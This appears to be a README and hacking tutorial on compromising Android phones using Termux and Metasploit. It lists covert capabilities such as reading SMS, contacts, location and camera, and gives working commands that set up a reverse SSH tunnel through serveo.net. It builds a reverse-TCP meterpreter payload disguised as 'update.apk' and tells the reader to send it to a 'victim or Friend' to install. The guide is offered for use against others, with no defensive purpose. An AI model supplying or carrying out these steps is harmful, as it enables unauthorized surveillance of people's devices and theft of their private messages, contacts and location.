# msfdocker
metaspolit framework with  ubuntu14.04 docker
its a verry important tool to hack any android device 
How to hack victim's device using termux?
August 9, 2020 by @sudhanshuss
Full access on victim's device

Following Option, You Can Use Through Termux App to Hack Any Android Device
Battery Status
SMS Inbox read
SMS Send    
Telephony Device Info
Toast
TTS Engine in Android
TTS Speak
Vibrate the Phone
Wi-Fi Connection Info
Wi-Fi Scan Info
Camera Info
Camera Photo
Clipboard Ge
Clipboard Set
Contact List
Download file with Android Download Manager
Location via GPS, Mobile Network or Wi-Fi
Notification
Open URL
Share file with Android actions
Requirements :
Android 5.0 and Above
Termux android app.
Install the Metasploit framework in Termux. I will show you how to install Metasploit in Termux below.
Termux should be allowed to external storage. ( for this only enter this command at once ‘‘Termux-setup-storage” )
Step 1: install Metasploit framework in Termux to Hack Any Android Device
✅ first install Termux, links are given above.
✅open the app and wait while it installs some file.
✅ hit the command.
apt update $ apt upgrade
✅ then enter or copy this command
apt install curl
✅ enter or copy this


curl -LO https://raw.githubusercontent.com/Hax4us /Metasploit_termux/master/metasploit.sh
✅ now give permission by giving this command.
chmod +x metasploit.sh
./metasploit.sh
✅ and now wait until processing and downloading.. it can take up to 40 min, depend upon internet speed
✅ now you have successfully installed the Metasploit framework.
Metasploit framework

Also, Read How To Change Mac Address Of Your Android Device And Windows
Step 2: port forwarding
✅ open Termux and type the below command. it will successfully install the open ssh
pkg install openssh
✅ after that type the below command and your session will start.


ssh -R 4564:localhost:4564 serveo.net

✅ Now the session has successfully started.
Step 3: creating Apk file with an embedded payload
✅ firstly type the below command to get a payload app and Hack Any Android Device
msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=4564 R > storage/download/update.apk

✅ wait for a min and you successfully create the payload app.

Now The Main Step Send The Created App to Your victim or Friend And Ask them To install this app.
Step 4: setup Metasploit in Termux
✅ Activate Metasploit framework in Termux by entering this command in the new session
msfconsole
